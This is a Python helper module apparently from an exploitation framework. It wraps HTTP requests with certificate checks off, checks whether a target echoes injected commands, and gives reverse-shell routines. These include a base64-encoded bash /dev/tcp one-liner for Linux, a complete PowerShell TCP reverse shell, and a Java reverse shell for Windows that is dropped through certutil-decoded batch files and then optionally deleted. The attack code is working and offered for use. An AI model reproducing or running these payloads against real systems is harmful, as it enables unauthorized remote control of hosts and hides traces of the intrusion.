import copy
import re
import time
import click
from bs4 import BeautifulSoup
import shlex
import requests
from requests.exceptions import ChunkedEncodingError, ConnectionError, ConnectTimeout
import base64
from exploit.static_tools import handle_tools


_default_headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
}
_proxies = None
_timeout = 10

_default_process = 10

_method = "cmd_exec"


def parser_headers(headers):

    """格式化处理命令行传入的headers"""

    if not headers:
        return _default_headers

    new_headers = copy.deepcopy(_default_headers)
    headers = headers.split('&')
    for header in headers:
        header = header.split(':')
        new_headers[header[0].split()] = header[1].split()

    return new_headers

def parser_cmd(cmd, type='string'):
    cmd = shlex.split(cmd)
    if type == 'string':
        cmd_str = '"' + '","'.join(cmd) + '"'
    elif type == 'xml':
        cmd_str = '<string>' + '</string><string>'.join(cmd) + '</string>'
    else:
        cmd_str = cmd
    return cmd_str

def get_html_text(html):

    """获取执行回显"""

    p = str(html).split("\n")
    return p[len(p) - 1]

def perform_echo(self,html):
    pattern = re.compile(r'[^&]+(?==\{exp\})', re.S)
    re_result = re.findall(pattern, self.data)

    soup = BeautifulSoup(html, "html.parser")
    soup_result = soup.find_all('input')

    html = ''.join(tag['value'] for tag in soup_result if re_result[0] in str(tag))

    return html

def post(url, data=None, headers=None, encoding='utf-8', files=None):

    """POST请求发送包装"""

    try:
        r = requests.post(url, data=data, headers=headers, proxies=_proxies, files=files, verify=False, timeout=_timeout)
        html_text = r.content.decode(encoding)
        return html_text.replace('\x00', '').strip()

    except ChunkedEncodingError as e:
        html_text = post_stream(url, data, headers, encoding, files)
        return html_text
    except ConnectionError as e:
        return "ERROR:" + "HTTP connection error"
    except ConnectTimeout as e:
        return "ERROR:" + "HTTP connection timeout"
    except Exception as e:
        return 'ERROR:' + str(e)

def post_stream(url, data=None, headers=None, encoding='UTF-8', files=None):

    """分块接收数据"""

    try:
        r_lines = requests.post(url, headers=headers, data=data, stream=True, proxies=_proxies, verify=False, timeout=_timeout, files=None)

        html_text =list()
        for line in r_lines.iter_lines():
            line = line.decode(encoding)
            html_text.append(line.strip())

        return '\r\n'.join(html_text).strip()

    except ChunkedEncodingError as e:
        return '\r\n'.join(html_text).strip()
    except ConnectionError as e:
        return "ERROR:" + "HTTP connection error"
    except ConnectTimeout as e:
        return "ERROR:" + "HTTP connection timeout"
    except Exception as e:
        return 'ERROR:' + str(e)

def get(url, headers=None, encoding="UTF-8"):
    try:
        r = requests.get(url, headers=headers, proxies=_proxies, timeout=_timeout, verify=False)
        html_text = r.content.decode(encoding)
        return html_text.replace('\x00', '').strip()
    except ChunkedEncodingError as e:
        html = get_stream(url, headers, encoding)
        return html
    except ConnectionError as e:
        return "ERROR:" + "HTTP connection error"
    except ConnectTimeout as e:
        return "ERROR:" + "HTTP connection timeout"
    except Exception as e:
        return 'ERROR:' + str(e)

def get_stream(url, headers=None, encoding="UTF-8"):
    try:
        r_lines = requests.get(url, headers=headers, stream=True, proxies=_proxies, timeout=_timeout, verify=False)
        html_text = list()

        for line in r_lines.iter_lines():
            if b'\x00' in line:
                continue
            line = line.decode(encoding)
            html_text.append(line.strip())
        return '\r\n'.join(html_text).strip()
    except ChunkedEncodingError as e:
        return '\r\n'.join(html_text).strip()
    except ConnectionError as e:
        return "ERROR:" + "HTTP connection error"
    except ConnectTimeout as e:
        return "ERROR:" + "HTTP connection timeout"
    except Exception as e:
        return 'ERROR:' + str(e)

def get_redirect(url, headers=None, encoding="UTF-8"):
    try:
        r = requests.get(url, headers=headers, proxies=_proxies, timeout=_timeout, verify=False, allow_redirects=False)
        if r.status_code == 302:
            html_text = r.headers.get("Location", "")
        elif r.status_code == 200:
            html_text = r.content.decode(encoding)
            html_text = html_text.replace('\x00', '').strip()
        else:
            html_text = ""
        return html_text
    except ConnectionError as e:
        return "ERROR:" + "HTTP connection error"
    except ConnectTimeout as e:
        return "ERROR:" + "HTTP connection timeout"
    except Exception as e:
        return 'ERROR:' + str(e)

def echo_check(self):

    num = handle_tools.get_hash()
    html = self.exec_cmd(f"echo {num}")
    nott = f"(echo {num}|echo%20{num}|echo%22%2C%22{num}|echo\+{num})"

    if html.startswith("ERROR:"):
        return html
    elif len(re.findall(nott,html)) == 0 or num in html:
        if num in html:
            return True
    else:
        return False

def read_file(file_path,encoding="UTF-8"):
    if handle_tools.check_file(file_path):
        with open(file_path, 'r', encoding=encoding) as f:
            data = f.read()
        return data

def reverse_shell(self, ip, port):

    """Linux系统反弹shell"""

    cmd = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    cmd = base64.b64encode(cmd.encode()).decode()
    shell = self.shell.replace('SHELL', cmd)
    html = self.exec_cmd(shell)
    return html

def reverse_shell_win(self, ip, port, method=_method):

    """Windows系统反弹shell"""

    cmd = """powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback  = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
    """
    cmd2 = "echo import java.io.InputStream;import java.io.OutputStream;import java.net.Socket;public class winshell{{public static void main(String[] args) throws Exception {{String host=\"{ip}\";int port={port};String cmd=\"cmd.exe\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()^>0)so.write(pi.read());while(pe.available()^>0)so.write(pe.read());while(si.available()^>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {{p.exitValue();break;}}catch (Exception e){{}}}};p.destroy();s.close();}}}}> winshell.java\npowershell javac winshell.java && java -cp .\ winshell"

    if method == "cmd_exec":
        cmd = cmd.format(ip=ip, port=port)
        html = self.exec_cmd(cmd)
        return html
    elif method == "bat_file":
        cmd = cmd.format(ip=ip, port=port)
        cmd = base64.b64encode(cmd.encode()).decode()

        self.exec_cmd("cmd /c echo " + cmd + " >cmd.txt")
        click.echo("[+] Attempt to write command")
        html = self.exec_cmd("cmd /c certutil -f -decode \"cmd.txt\" \"cmd.bat\"")
        click.echo("[+] Attempt to deploy bat file")

        click.echo("[+] Try bouncing shell")
        self.exec_cmd("cmd /c cmd.bat")

        click.echo("[-] Script file: cmd.txt cmd.bat")
        flag = input("Clear script file?(Y/N)")
        if flag in ("yes", "Y"):
            self.exec_cmd("cmd /c del cmd.txt cmd.bat")
            click.echo("[+] All clear")
        return html
    elif method == "java_exec":
        cmd = cmd2.format(ip=ip, port=port)
        cmd = base64.b64encode(cmd.encode()).decode()

        self.exec_cmd("cmd /c echo " + cmd + " >cmd.txt")
        click.echo("[+] Attempt to write command")
        html = self.exec_cmd("cmd /c certutil -f -decode \"cmd.txt\" \"cmd.bat\"")
        click.echo("[+] Attempt to deploy bat file")

        click.echo("[+] Try bouncing shell")
        self.exec_cmd("cmd /c cmd.bat")

        click.echo("[-] Script file: cmd.txt cmd.bat winshell.java winshell.class")
        flag = input("Clear script file?(Y/N)")
        if flag in ("yes", "Y"):
            self.exec_cmd("cmd /c del cmd.txt cmd.bat winshell.java winshell.class")
            click.echo("[+] All clear")
        return html
